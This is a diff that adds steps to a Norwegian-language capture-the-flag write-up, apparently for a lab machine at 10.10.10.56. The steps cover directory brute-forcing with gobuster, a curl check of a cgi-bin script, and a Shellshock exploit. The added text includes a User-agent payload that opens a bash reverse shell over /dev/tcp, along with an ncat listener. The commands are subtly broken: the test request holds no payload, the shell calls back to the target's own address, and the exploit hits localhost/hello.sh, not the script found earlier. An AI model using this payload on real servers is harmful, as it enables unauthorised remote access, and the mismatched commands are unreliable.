@@ -23,6 +23,33 @@ Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds
 ```
 
 ### Hva vi gjør:
-1. Det første vi gjør er å gå inn på nettsiden, der ser vi ikke mye annet dette:
-<img src="">
-2. 
+Det første vi gjør er å gå inn på nettsiden, der ser vi ikke mye annet dette:
+<img src="website.png">
+<p>Deretter kjører vi gobuster for å finne directories i nettsiden. Vi finner cgi-bin, server-status og /icons/READme.</p>
+Jeg vil gjerne se mer av cgi-bin, så jeg kjører gobuster videre fra /cgi-bin/
+
+```
+gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x sh,pl
+```
+Vi finner kjapt: <b>user.sh</b>.
+<p>Med litt kjapp google søk finner vi denne <a href="https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock">artikklen</a></p>
+Vi kjører en test:
+
+```
+curl -H "User-agent: myuseragent" http://10.10.10.56/cgi-bin/user.sh
+
+vulnerable
+
+Content-Type: text/plain
+Just an uptime test script
+```
+Dette betyr vi kan injecte commands til maskinen og vi gjør da et reverse shell!
+
+```
+ncat -lvnp 1234
+
+curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.56/1234 0>&1" http://localhost/cgi-bin/hello.sh
+```
+
+Og vi har shell!
+<img src="shell.png">
